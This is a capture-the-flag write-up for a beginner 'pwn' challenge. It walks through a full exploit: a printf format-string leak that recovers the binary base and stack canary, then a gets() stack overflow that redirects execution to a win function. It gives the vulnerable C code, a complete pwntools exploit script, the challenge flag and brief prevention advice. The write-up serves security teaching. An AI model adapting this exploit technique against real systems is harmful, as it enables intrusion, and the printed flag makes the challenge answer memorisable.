# Intro to Pwning 2

## Information
Category: Pwn   
Difficulty: Baby   
Author: LiveOverflow   
Dependencies: Intro to Pwning 1   
First Blood: BoredPerson   
Description: Service running at: hax1.allesctf.net:9101   

## Solution

Looking at the supplied source code gives us enough information to get a good idea what we are to exploit here. We need to somehow return into the function
WINgardium_leviosa(). 
To do so, we have to override the return address of the current function frame on the stack. However, it is not as easy as it sounds as the binary is compiled with
position independant code enabled and we also now have the challange of circumventing the stack protection.   

First, lets take a closer look at the code from a hacker perpective:

In the main function, two functions are called whose potential exploitable characteristics are shown here:

### welcome():
```c
void welcome() {
    char read_buf[0xff];
    printf("Enter your witch name:\n");
    gets(read_buf);
    printf("┌───────────────────────┐\n");
    printf("│ You are a Hufflepuff! │\n");
    printf("└───────────────────────┘\n");
    printf(read_buf);
}
```
In this function we able to exploit a buffer overflow vulnerability and format string vulnerablity.
However, using the first excludes the latter in terms of usuability.

### AAAAAAAA():
```c
void AAAAAAAA() {
    char read_buf[0xff];
    
    printf(" enter your magic spell:\n");
    gets(read_buf);
    if(strcmp(read_buf, "Expelliarmus") == 0) {
        printf("~ Protego!\n");
    } else {
        printf("-10 Points for Hufflepuff!\n");
        _exit(0);
    }
}
```
Here, we can again give input over an insecure function and overflow the stack

So we need to get the base address of the binary first, which we can accomplish by exploiting a format string vulnerability in a printf() function.
This can leak various important refrences that exist in the upper stack frames, but we are only interested in some pointer into out binary image and the
stack canary that we need to put back such that the binary will not terminate.

Next, knowing the correct binary offset, we can calculate the current address of WINgardium_leviosa() and take the next opportunity in the AAAAAAAAA()
function to overwrite the return address of the current stack frame and reput the stack canary at its place.


Again, we need to calculate the correct address for WINgardium_leviosa() from the stack leak, but this time we also find and store the stack canary.
In this case, we first need to provide the password from stage 1.

```python
#!/usr/bin/python
from pwn import *
import time as t

STACK_CANARY_INDEX = 44

p = process("../resources/pwn2")
print("[info] attached to process ")

#prepare first payload (password)
PASSWORD = "CSCG{FLAG_FROM_STAGE_1}" # CSCG{NOW_GET_VOLDEMORT}

print("[info] password is")
print("[info] " + PASSWORD)

p.recvuntil("Enter the password of stage 1:\n")
p.sendline(PASSWORD)
print("successfully passed pw check")


fstring = "%p " * 50
p.recvuntil("Enter your witch name:\n")
p.sendline(fstring)
leak = p.recvuntil(" enter your magic spell:\n")
addr_arr = leak.split(" ")
# info
for x in addr_arr:
    print(x)

retp_welcome = addr_arr[46] # correct
p_win = int(retp_welcome,16) - 0x26a
p_win_ret = p_win + 0x3a
stack_canary = addr_arr[STACK_CANARY_INDEX]
```

Now we simply construct our modified payload from the first challange

```python 
print("[info] retp_welcome@ "+ retp_welcome)
print("[info] p_win@ " + hex(p_win))
print("[info] p_win_ret@ " + hex(p_win_ret))
print("[info] stack_canary@ " + stack_canary)
print("[info] indexof stack_canary@ " + hex(STACK_CANARY_INDEX))

padding = "Expelliarmus\0x00"
padding += (0xff - (len(padding)+1)) * 'P' # fill to 255
padding += 10 * 'A' # alignment
padding += p64(int(stack_canary,16), endian='little') # 8 byte stack canary
padding += 8 * 'B'
padding += p64(p_win_ret, endian='little')
padding += p64(p_win, endian='little')
p.sendline(padding)
p.interactive()
```

Now, we just need to adjust our local exploit for remote use, and we get the flag: CSCG{NOW_GET_VOLDEMORT}

## Prevention

A possible fix for this issue could include sanitizing user input before echoing it via printf(). Outdatad functions like
gets() should also be avoided.